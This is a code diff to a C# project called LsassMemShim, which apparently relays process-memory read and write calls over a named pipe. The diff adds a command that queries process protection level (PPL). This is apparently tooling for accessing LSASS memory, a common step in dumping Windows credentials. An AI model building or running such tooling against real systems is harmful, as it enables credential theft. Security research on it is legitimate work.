@@ -5,6 +5,7 @@ using System.IO.Pipes;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using static LsassMemShim.PPL;
 
 namespace LsassMemShim
 {
@@ -19,6 +20,7 @@ namespace LsassMemShim
             OpenProcess,
             ReadProcessMemory,
             WriteProcessMemory,
+            GetProcessProtectionLevel,
             Close
         }
         static IntPtr handle = IntPtr.Zero;
@@ -69,6 +71,11 @@ namespace LsassMemShim
                             buf = new Byte[len];
                             server.Read(buf, 0, buf.Length);
                             WriteProcessMemory(handle, addr, buf, len, out _);
+                        }
+                        if ((Command)cmd[0] == Command.GetProcessProtectionLevel)
+                        {
+                            var procProtLevel = PPL.GetProcessProtectionLevel();
+                            server.Write(BitConverter.GetBytes((uint)procProtLevel), 0, 4);
                         }
                         if ((Command)cmd[0] == Command.Close)
                         {
@@ -136,6 +143,13 @@ namespace LsassMemShim
             Client.Write(BitConverter.GetBytes(address), 0, 8);
             Client.Write(BitConverter.GetBytes(value.Length), 0, 4);
             Client.Write(value, 0, value.Length);
+        }
+        public static ProcessProtectionLevels GetProcessProtectionLevel()
+        {
+            Client.Write(new Byte[1] { (Byte)Command.GetProcessProtectionLevel }, 0, 1);
+            var buf = new Byte[4];
+            var handleSize = Client.Read(buf, 0, buf.Length);
+            return (ProcessProtectionLevels)BitConverter.ToUInt32(buf, 0);
         }
         public static void Close()
         {
